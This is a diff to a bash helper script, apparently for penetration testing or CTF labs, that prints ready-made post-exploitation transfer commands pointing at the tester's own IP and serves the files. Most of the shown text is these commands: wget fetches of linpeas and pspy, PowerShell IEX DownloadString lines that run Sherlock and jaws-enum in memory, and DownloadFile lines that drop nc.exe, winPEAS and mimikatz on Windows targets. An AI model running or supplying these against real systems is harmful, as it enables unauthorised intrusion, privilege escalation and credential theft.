@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # display file transfer commands for priv-esc
+# Apache2 server (port 80) is used by default
 
 Frame='\033[0;32m'   # Green
 Link='\033[0;35m'  	 # Purple
@@ -9,49 +10,41 @@ Comment='\033[0;36m' # Cyan
 End='\033[0m'		 # No Color
 Point='\033[0;31m[*]\033[0m'
 
-path='/home/kali/Tools/myTools/privesc' # CHANGE HERE if you need
-
 port=$1
 ip=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1) 2>/dev/null
 
-if [ "$port" == "" ]; then
-	port=6666 # default port
-fi
+# if [ "$port" == "" ]; then
+# 	port=6666 # default port
+# fi
 
 if [ "$ip" == "" ]; then
 	ip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
 fi
 
-cd $path
-
-sudo echo -e "${Frame}###${End} http://$ip:$port ${Frame}###${End}\n"
+echo -e "${Frame}###${End} http://$ip ${Frame}###${End}\n"
 
 echo -e "${Frame}###${End} ${Title}Linux Enum Scripts${End} ${Frame}###${End}"
-echo -e "${Point} wget http://$ip:$port/linpeas.sh -O /tmp/linpeas.sh"
-echo -e "${Point} wget http://$ip:$port/LinEnum.sh -O /tmp/LinEnum.sh"
-echo -e "${Point} wget http://$ip:$port/pspy32 -O /tmp/pspy32"
-echo -e "${Point} wget http://$ip:$port/pspy64 -O /tmp/pspy64"
+echo -e "${Point} wget http://$ip/linpeas.sh -O /tmp/linpeas.sh"
+echo -e "${Point} wget http://$ip/LinEnum.sh -O /tmp/LinEnum.sh"
+echo -e "${Point} wget http://$ip/pspy32 -O /tmp/pspy32"
+echo -e "${Point} wget http://$ip/pspy64 -O /tmp/pspy64"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Enum Scripts${End} ${Frame}###${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip:$port/jaws-enum.ps1');\" ${Comment}# run on memory${End}"
-echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip:$port/Sherlock.ps1'); Find-AllVulns;\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/jaws-enum.ps1');\" ${Comment}# run on memory${End}"
+echo -e "${Point} Powershell \"IEX (New-Object Net.WebClient).Downloadstring('http://$ip/Sherlock.ps1'); Find-AllVulns;\" ${Comment}# run on memory${End}"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Windows Binaries${End} ${Frame}###${End}"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/wget.exe', 'C:\\\Users\\\Public\\\Documents\\\wget.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/nc.exe', 'C:\\\Users\\\Public\\\Documents\\\nc.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/whoami.exe', 'C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/winPEASany.exe', 'C:\\\Users\\\Public\\\Documents\\\winPEASany.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/mimikatz32.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
-echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/mimikatz64.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/wget.exe', 'C:\\\Users\\\Public\\\Documents\\\wget.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/nc.exe', 'C:\\\Users\\\Public\\\Documents\\\nc.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/whoami.exe', 'C:\\\Users\\\Public\\\Documents\\\whoami.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/winPEASany.exe', 'C:\\\Users\\\Public\\\Documents\\\winPEASany.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz32.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz32.exe')"
+echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/mimikatz64.exe', 'C:\\\Users\\\Public\\\Documents\\\mimikatz64.exe')"
 echo -e ""
 echo -e ""
-
-
-python3 -m http.server $port
-
 
 
